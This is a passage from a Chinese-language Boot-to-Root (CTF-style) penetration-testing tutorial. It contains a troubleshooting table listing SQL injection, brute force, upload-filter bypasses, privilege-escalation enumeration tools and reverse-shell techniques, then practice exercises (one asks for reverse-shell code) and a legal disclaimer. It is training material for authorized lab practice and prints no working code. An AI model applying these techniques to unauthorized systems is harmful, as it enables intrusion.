| 找不到Web漏洞 | 查看源码注释、JS文件、robots.txt、隐藏目录 |
| 登录页面绕不过 | SQL注入、暴力破解、默认密码、注册绕过 |
| 文件上传被拦截 | 改后缀、加文件头、00截断、解析漏洞 |
| 提权找不到方法 | 用LinPEAS/WinPEAS全面枚举、查GTFOBins |
| Shell不稳定 | 升级Shell、用meterpreter、尝试多种反弹方式 |

**经验总结**：B2R解题的核心是系统化的方法+丰富的经验。遇到卡壳时，回到信息收集阶段，往往遗漏了关键信息。

---

## 八、练习题

### 基础题（5道）

1. **什么是Boot-to-Root？它和CTF有什么区别和联系？请列举至少4个主流的B2R平台。**

2. **B2R的标准渗透流程是什么？请详细描述每个阶段的目标和主要操作。**

3. **信息收集在B2R中有多重要？请列举至少5个信息收集的维度和对应的工具/命令。**

4. **Linux提权有哪些常见方法？请至少列举5种，并说明各自的利用条件。**

5. **什么是反向Shell和正向Shell？它们分别适用于什么场景？请写出至少3种不同语言的反向Shell代码。**

### 进阶题（5道）

6. **假设你面对一台未知的Linux靶机，请设计一套完整的B2R渗透测试方案，包括时间分配、工具选择、检查清单，确保在4小时内尽可能完成。**

7. **对比VulnHub、Hack The Box、TryHackMe三个平台的优缺点，针对不同基础的学习者（零基础、入门、进阶）分别推荐合适的平台和学习路径。**

8. **请设计一个B2R提权阶段的检查清单（Checklist），按照利用难度从易到难排序，包含至少10种提权方法的检查步骤和利用方式。**

9. **在B2R中，如果Web层面找不到漏洞，还有哪些攻击路径？请列举至少5种非Web的攻击向量，并说明对应的利用条件和工具。**

10. **结合B2R的学习经验，总结一套从B2R到真实渗透测试的能力迁移方法，包括技能转化、思维转变、工具链搭建等方面。**

---

## 安全提醒

> **⚠️ 重要声明**
>
> 本文档中的所有技术内容仅供学习和研究使用，仅适用于在**合法授权的靶场环境**中进行练习。
>
> - 请勿在未授权的任何系统上使用本文档中描述的技术
> - 请遵守《网络安全法》及相关法律法规
> - 任何未经授权的渗透测试行为均属于违法行为
> - 学习过程中请尊重他人隐私和知识产权
> - 下载和使用第三方靶场镜像时请确保来源可靠
>
> 安全技术应用于防护和建设，而非攻击和破坏。请树立正确的网络安全观，做遵纪守法的白帽黑客。
